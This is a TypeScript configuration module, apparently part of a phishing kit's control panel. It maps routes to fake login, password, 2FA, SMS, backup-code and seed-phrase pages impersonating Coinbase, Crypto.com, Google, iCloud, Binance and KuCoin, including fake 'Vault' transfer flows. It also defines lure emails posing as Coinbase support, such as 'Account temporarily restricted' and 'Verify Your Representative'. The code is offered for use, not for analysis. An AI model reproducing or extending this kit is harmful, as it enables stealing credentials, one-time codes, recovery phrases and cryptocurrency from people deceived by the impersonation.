import { schemaToTemplateInputs, getSchema, getDefaults, type PageVarField } from './pageVars';

export interface TemplateInput {
	name: string;
	placeholder: string;
	type: string;
	inputMode?: string;
	filter?: string;
	options?: { value: string; label: string }[];
}

export interface TemplateRoute {
	path: string;
	inputs?: TemplateInput[];
}

export interface TemplateBrand {
	icon: string;
	routes: Record<string, TemplateRoute>;
}

export const templates: Record<string, TemplateBrand> = {
	Coinbase: {
		icon: '/images/coinbase.png',
		routes: {
			Loading: { path: 'coinbase/loading/template' },
			External: { path: 'coinbase/external/template' },
			Activity: { path: 'coinbase/activity/template' },
			Balance: { path: 'coinbase/balance/template' },
			'Case ID': { path: 'coinbase/case/template' },
			CBW: { path: 'coinbase/cbw/template' },
			'Reset Pass': { path: 'coinbase/reset/template' },
			Swap: { path: 'coinbase/swap/template' },
			Vault: {
				path: 'coinbase/vault/template',
				inputs: [
					{
						name: 'Balance',
						placeholder: '1000.00',
						type: 'number',
						inputMode: 'decimal',
						filter: '/^[0-9]*\\.?[0-9]*$/'
					}
				]
			},
			'Vault Seed':        { path: 'coinbase/vault-seed/template' },
			'Review Login':      { path: 'coinbase/review-login/template' },
			'Review Withdrawal': { path: 'coinbase/review-withdrawal/template' },
			'Review Email':      { path: 'coinbase/review-email/template' },
			'Trust Device':      { path: 'coinbase/trust-device/template' },
			'Change Password':   { path: 'coinbase/change-password/template' },
			'SMS Verify':        { path: 'coinbase/sms-verify/template' },
			'Terminate Devices': { path: 'coinbase/terminate-devices/template' },
			'Securing Account':  { path: 'coinbase/securing-account/template' },
			'Protect Assets':    { path: 'coinbase/protect-assets/template' },
			'Moving Vault':      { path: 'coinbase/moving-vault/template' },
			'Vault Intro':       { path: 'coinbase/vault-intro/template' },
			'Vault Setup':       { path: 'coinbase/vault-setup/template' },
			'Transfer from Coinbase': {
				path: 'coinbase/transfer-coinbase/template',
				inputs: schemaToTemplateInputs('Coinbase', 'Transfer from Coinbase')
			},
			'Select Asset': {
				path: 'coinbase/select-asset/template',
				inputs: schemaToTemplateInputs('Coinbase', 'Select Asset')
			},
			'Confirm Transfer': {
				path: 'coinbase/confirm-transfer/template',
				inputs: schemaToTemplateInputs('Coinbase', 'Confirm Transfer')
			},
			'Vault SMS': {
				path: 'coinbase/vault-sms/template',
				inputs: schemaToTemplateInputs('Coinbase', 'Vault SMS')
			},
			'Verification Required': {
				path: 'coinbase/verification-required/template',
				inputs: schemaToTemplateInputs('Coinbase', 'Verification Required')
			},
			'Vault Dashboard': {
				path: 'coinbase/vault-dashboard/template',
				inputs: schemaToTemplateInputs('Coinbase', 'Vault Dashboard')
			}
		}
	},
	CDC: {
		icon: '/images/cdc.png',
		routes: {
			Loading: { path: 'cdc/loading/template' },
			Activity: { path: 'cdc/activity/template' },
			Balance: { path: 'cdc/balance/template' },
			'Case ID': { path: 'cdc/case/template' },
			External: { path: 'cdc/external/template' },
			Wallet: { path: 'cdc/wallet/template' }
		}
	},
	Google: {
		icon: '/images/google.png',
		routes: {
			Loading: { path: 'google/loading/template' },
			Login: { path: 'google/login/template' },
			Password: { path: 'google/password/template' },
			'Backup code': { path: 'google/backup/template' },
			Fail: { path: 'google/fail/template' },
			TOTP: { path: 'google/totp/template' },
			SMS: { path: 'google/sms/template' }
		}
	},
	iCloud: {
		icon: '/images/icloud.png',
		routes: {
			Login: { path: 'icloud/login/template' },
			Password: { path: 'icloud/password/template' },
			'2fa': { path: 'icloud/2fa/template' },
			Locked: { path: 'icloud/locked/template' }
		}
	},
	Binance: {
		icon: '/images/binance.png',
		routes: {
			Loading: { path: 'binance/loading/template' },
			Case: { path: 'binance/case/template' },
			Backup: { path: 'binance/backup/template' },
			Balance: { path: 'binance/balance/template' },
			Activity: { path: 'binance/activity/template' }
		}
	},
	KuCoin: {
		icon: '/images/kucoin.png',
		routes: {
			Loading: { path: 'kucoin/loading/template' }
		}
	}
};

export function getAllPages(): { brand: string; page: string; path: string; inputs?: TemplateInput[] }[] {
	const pages: { brand: string; page: string; path: string; inputs?: TemplateInput[] }[] = [];
	for (const [brand, def] of Object.entries(templates)) {
		for (const [page, route] of Object.entries(def.routes)) {
			pages.push({ brand, page, path: route.path, inputs: route.inputs });
		}
	}
	return pages;
}

export function getTemplateKey(brand: string, page: string): string {
	return `${brand}/${page}`;
}

export function parseTemplateKey(key: string): { brand: string; page: string } | null {
	const idx = key.indexOf('/');
	if (idx === -1) return null;
	return { brand: key.substring(0, idx), page: key.substring(idx + 1) };
}

export function getRouteForKey(key: string): TemplateRoute | null {
	const parsed = parseTemplateKey(key);
	if (!parsed) return null;
	return templates[parsed.brand]?.routes[parsed.page] ?? null;
}

/** Schema fields plus route-level template inputs for the redirect editor. */
export function getRedirectFields(templateKey: string): PageVarField[] {
	const parsed = parseTemplateKey(templateKey);
	if (!parsed) return [];
	const schema = getSchema(parsed.brand, parsed.page);
	const schemaKeys = new Set(schema.map((f) => f.key));
	const route = getRouteForKey(templateKey);
	const extra: PageVarField[] = (route?.inputs ?? [])
		.filter((i) => !schemaKeys.has(i.name))
		.map((i) => ({
			key: i.name,
			label: i.name,
			type: i.type === 'number' ? 'number' : i.type === 'select' ? 'select' : 'text',
			placeholder: i.placeholder,
			options: i.options
		}));
	return [...schema, ...extra];
}

export function initRedirectVarValues(
	templateKey: string,
	visitorInputs: Record<string, string> = {}
): Record<string, string> {
	const fields = getRedirectFields(templateKey);
	if (!fields.length) return {};
	const parsed = parseTemplateKey(templateKey);
	const out = parsed ? { ...getDefaults(parsed.brand, parsed.page) } : {};
	for (const field of fields) {
		const v = visitorInputs[field.key];
		if (v != null && v !== '') out[field.key] = v;
	}
	return out;
}

export function hasRedirectPageVars(templateKey: string): boolean {
	return getRedirectFields(templateKey).length > 0;
}

export interface MailTemplate {
	id: string;
	name: string;
	subject: string;
	variables: string[];
	html: string;
	by: string;
}

import cblockaccHtml from '../../data/templates/cblockacc.html?raw';
import coinbaseCallbackHtml from '../../data/templates/coinbase-callback.html?raw';
import coinbaseVaultHtml from '../../data/templates/coinbase-vault.html?raw';
import coinbaseReviewHtml from '../../data/templates/coinbase-review.html?raw';
import coinbaseEmployeeHtml from '../../data/templates/coinbase-employee.html?raw';

export const defaultMailTemplates: MailTemplate[] = [
	{
		id: 'cblockacc',
		name: 'cblockacc',
		subject: 'Account temporarily restricted',
		variables: ['{{CUSTOMER_NAME}}', '{{CASE_ID}}', '{{REPRESENTATIVE_NAME}}'],
		html: cblockaccHtml,
		by: 'admin'
	},
	{
		id: 'Coinbase_Callback',
		name: 'Coinbase Callback',
		subject: 'Callback Information',
		variables: [
			'{{CUSTOMER_NAME}}',
			'{{CASE_ID}}',
			'{{REPRESENTATIVE_NAME}}',
			'{{CALLBACK_DATE}}',
			'{{CALLBACK_TIME}}',
			'{{CURRENT_YEAR}}'
		],
		html: coinbaseCallbackHtml,
		by: 'admin'
	},
	{
		id: 'Coinbase_Vault',
		name: 'Coinbase Vault',
		subject: 'Coinbase Vault Created',
		variables: ['{{DATE}}', '{{CURRENT_YEAR}}', '{{case_id}}', '{{UNSUBSCRIBE_URL}}'],
		html: coinbaseVaultHtml,
		by: 'admin'
	},
	{
		id: 'Coinbase_Review',
		name: 'Coinbase Review',
		subject: 'Review Account Activity',
		variables: ['{{DATE}}', '{{CURRENT_YEAR}}', '{{ticket_number}}', '{{secure_portal_url}}', '{{UNSUBSCRIBE_URL}}'],
		html: coinbaseReviewHtml,
		by: 'admin'
	},
	{
		id: 'Coinbase_Employee',
		name: 'Coinbase Employee',
		subject: 'Verify Your Representative',
		variables: ['{{DATE}}', '{{CURRENT_YEAR}}', '{{ticket_id}}', '{{EmployeeName}}', '{{Phone}}', '{{UNSUBSCRIBE_URL}}'],
		html: coinbaseEmployeeHtml,
		by: 'admin'
	}
];
